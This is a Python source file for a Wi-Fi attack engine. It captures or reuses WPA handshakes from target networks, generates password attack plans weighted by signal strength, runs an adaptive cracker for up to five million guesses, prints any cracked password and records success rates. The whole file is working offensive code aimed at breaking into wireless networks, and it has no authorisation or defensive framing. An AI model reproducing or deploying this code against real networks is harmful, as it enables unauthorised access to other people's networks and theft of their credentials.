import time
import os
from core.error_handler import ErrorHandler


class RealAttackEngine:
    def __init__(self, config, error_handler):
        self.config = config
        self.error_handler = error_handler
        self.password_generator = None
        self.password_tester = None
        self.handshake_capture = None
        self.performance_tracker = None
        self.hashcat_wrapper = None
        self.adaptive_engine = None
        self.attack_results = []

    def initialize_engine(self):
        try:
            from engines.password_generator import PasswordGenerator
            from engines.password_tester import PasswordTester
            from engines.handshake_capture import HandshakeCapture
            from engines.adaptive_engine import AdaptiveAttackEngine
            from learning.performance_tracker import PerformanceTracker
            from tools.hashcat_wrapper import HashcatWrapper

            self.password_generator = PasswordGenerator(self.config, self.error_handler)
            self.password_tester = PasswordTester(self.config, self.error_handler)
            self.handshake_capture = HandshakeCapture(self.config, self.error_handler)
            self.performance_tracker = PerformanceTracker(self.config)
            self.hashcat_wrapper = HashcatWrapper(self.config, self.error_handler)
            self.adaptive_engine = AdaptiveAttackEngine(
                self.config, self.error_handler,
                self.password_generator, self.password_tester,
            )

            return True
        except Exception as e:
            self.error_handler.handle_error("E300", "Real attack engine init failed", e)
            return False

    def execute_real_attack(self, target, interface="wlan0mon",
                             max_duration=3600, seeds=None):
        bssid = target.get("bssid", "")
        ssid = target.get("ssid", "?")
        channel = target.get("channel", 1)
        signal = target.get("signal_strength", -100)

        print(f"\n   TARGET: {ssid} ({bssid})")
        print(f"   Signal: {signal} dBm  |  Channel: {channel}")

        start_time = time.time()
        result = {
            "target": target,
            "success": False,
            "password": None,
            "duration": 0,
            "tested_count": 0,
            "handshake_captured": False,
            "errors": [],
        }

        try:
            existing = self.handshake_capture.find_existing_handshake(bssid)
            if existing:
                handshake_file = existing
                result["handshake_captured"] = True
                print(f"   Using existing handshake: {handshake_file}")
            else:
                print(f"   Capturing handshake...")
                handshake_file = self.handshake_capture.capture_handshake(
                    bssid, channel, interface, timeout=180,
                )
                if not handshake_file:
                    result["errors"].append("Handshake capture failed")
                    self.performance_tracker.record_attack(target, result)
                    return result
                result["handshake_captured"] = True
                print(f"   Handshake captured: {handshake_file}")

            if not self.password_tester.setup_handshake_test(handshake_file):
                result["errors"].append("Handshake setup failed")
                self.performance_tracker.record_attack(target, result)
                return result

            print(f"   Cracking...")
            from intelligence.password_intelligence import PasswordIntelligence
            pi = PasswordIntelligence()

            if seeds:
                plan = pi.generate_attack_plan(target, max_duration)
                plan["seeds"] = list(dict.fromkeys(list(seeds) + plan["seeds"]))
            else:
                plan = pi.generate_attack_plan(target, max_duration)

            signal_factor = max(0.3, min(1.0, (signal + 90) / 60))
            adjusted_time = max(60, int(max_duration * signal_factor))
            plan["time_budget"] = adjusted_time

            found_pw, tested = self.adaptive_engine.execute_intelligent_crack(
                target, handshake_file, bssid, plan,
                max_tests=5000000,
            )

            result["success"] = found_pw is not None
            result["password"] = found_pw
            result["tested_count"] = tested
            result["duration"] = time.time() - start_time

            if found_pw:
                print(f"   CRACKED: {found_pw}")
            else:
                print(f"   Failed after {tested:,} tests")

            self.performance_tracker.record_attack(target, result)
            self.attack_results.append(result)
            return result

        except Exception as e:
            eid = self.error_handler.handle_error(
                "E300", f"Attack failed on {ssid}", e)
            result["errors"].append(f"Error {eid}: {e}")
            result["duration"] = time.time() - start_time
            return result

    def get_attack_statistics(self):
        total = len(self.attack_results)
        ok = len([r for r in self.attack_results if r["success"]])
        hc = len([r for r in self.attack_results if r.get("handshake_captured", False)])
        tested = sum(r["tested_count"] for r in self.attack_results)
        avg_time = (sum(r["duration"] for r in self.attack_results) / total
                    if total > 0 else 0)
        return {
            "total_attacks": total,
            "successful_attacks": ok,
            "success_rate": ok / total if total > 0 else 0,
            "handshake_success_rate": hc / total if total > 0 else 0,
            "total_tested": tested,
            "average_time": avg_time,
        }
